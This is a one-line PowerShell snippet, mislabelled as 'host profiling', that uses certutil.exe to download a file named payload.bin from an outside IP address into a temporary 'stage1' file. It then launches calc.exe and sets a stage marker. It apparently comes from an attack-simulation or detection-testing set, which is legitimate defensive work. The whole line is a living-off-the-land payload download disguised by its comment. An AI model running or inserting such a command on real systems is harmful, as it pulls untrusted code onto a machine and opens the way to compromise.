
<# Host profiling #> certutil.exe -urlcache -split -f "https://198.51.100.143:443/downloads/payload.bin" "$env:TEMP\stage1.bin"; Start-Process -FilePath "calc.exe" -ErrorAction SilentlyContinue; $StageMarker = "stage-36"
